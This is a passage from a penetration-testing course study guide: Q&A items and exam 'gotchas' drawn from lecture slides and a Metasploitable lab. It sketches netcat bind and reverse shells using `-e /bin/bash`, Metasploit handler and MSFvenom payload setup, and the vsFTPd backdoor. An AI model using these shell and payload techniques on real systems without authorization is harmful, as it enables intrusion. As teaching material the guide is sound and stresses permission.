**Q14. Why is searching exploit-db for a ready-made exploit risky, and what should you do?**
A. Because **not all exploits found online do what they claim** — some do *more* and can cause further damage to the target machine. You should read through the exploit code and understand what it does before running it (L03 p.19).

**Q15. (Lab) For Metasploitable 2 and 3, what minimum exploitation outcomes must you demonstrate, and what evidence is required?**
A. M2: at least one **backdoored service**, one **weak/default-credentials** service, one **RCE**, and one **misconfiguration** issue. M3: one **network-based RCE** (e.g. SMB), one **credential-based compromise**, and one **privilege escalation** (E03 p.3). Evidence per success: initial-access proof (`whoami`, `ip a`), privilege level (`id`/`getuid`), a session screenshot, the module used, and an attack-path explanation (E03 p.3).

**Q16. How do you query DNS during recon, and what does `dig +trace` add over `nslookup`?**
A. Tools: `nslookup www.google.com`, `host www.google.com`, `host -a gmail.com`, `dig +trace www.google.com` (L03 p.14). `dig +trace` walks the *hierarchical* DNS resolution from the root servers downward, showing each delegation step, rather than just returning a final answer from your resolver (L03 p.14, which stresses the "hierarchical DNS").

---

## Gotchas

- **"Pentest = secure" is wrong.** A pentest is *not* a guarantee of security; it only complements your security strategy (L03 p.7). Don't claim a system is safe because a test passed.
- **Authorization first, always.** The methodology begins with *getting permission*; without it, white-hat work becomes grey/black (L03 p.6, p.8). Scope is set by threat modelling (L03 p.8).
- **RHOST vs LHOST confusion is the classic Metasploit mistake.** R = remote/target, L = local/attacker (L03 p.26). Swapping them is why exploits and handlers "do nothing."
- **multi/handler must mirror the payload.** Payload type, LHOST and LPORT in the handler must match exactly what MSFvenom generated, or no session forms (E03 p.5).
- **Bind vs reverse direction.** In a bind shell the *victim* listens (`-lvnp`) and serves `-e /bin/bash`; in a reverse shell the *attacker* listens empty and the *victim* runs `-e /bin/bash` outward. The `-e /bin/bash` lives on whichever side serves the shell (L03 p.16–17). Reverse shells are favored because they punch out through inbound firewalls/NAT (L03 p.17).
- **`nc -e /bin/bash` is dangerous.** It lets *anyone* who reaches the port run commands on that host — only use it in the lab (L03 p.16).
- **Exploits are vulnerability-specific.** An exploit module only works if the target actually has that vulnerability; fingerprint with auxiliary scanners first (L03 p.27–28).
- **Don't trust random online exploits.** They may do more than advertised and damage the target; read the code first (L03 p.19).
- **vsFTPd backdoor lands on port 6200, not 21.** The exploit triggers via FTP (port 21) but the resulting bind shell listens on 6200 — that's the "why?" the slide asks (L03 p.31).
- **Payload delivery is the unsolved part of the lab.** MSFvenom builds the payload, but *getting the victim to run it* (social engineering/deception) is explicitly out of scope here and deferred to a later class — the lab fakes delivery with netcat (L03 p.40; E03 p.6).
- **Make ELF payloads executable.** After transfer you must `chmod a+x payload.elf` before `./payload.elf`, or it won't run (E03 p.5–6).
- **File-transfer redirection direction matters.** With netcat, `<` sends a file and `>` writes one; mixing them up transfers nothing or overwrites the wrong file (L03 p.18; E03 p.5).
- **Slide typos to recognize on the exam:** "Nopes" = NOP modules (L03 p.21); `post/linus/...` = `post/linux/...` (L03 p.34); "literal movement" = **lateral movement** (E03 p.2); "Theat Modelling" (L03 p.2). Don't reproduce the typos; know the correct terms.
- **lsof/netstat need privileges.** Full socket/process information requires administrative rights (L03 p.13).
- **Submission scope (lab):** only **Part 1** (Exploitation) must be submitted via itslearning; Part 2 (payloads) is optional, and this submission supports the final written exam (E03 p.1, p.6).

---

*End of chapter 03 — Penetration Testing. Grounded in L03 (42 slides) and E03 (Lab 03, 6 pages). Items the slides only gesture at (e.g., the precise mechanics of why a reverse shell defeats NAT, or full CVE numbers) are flagged inline rather than invented.*
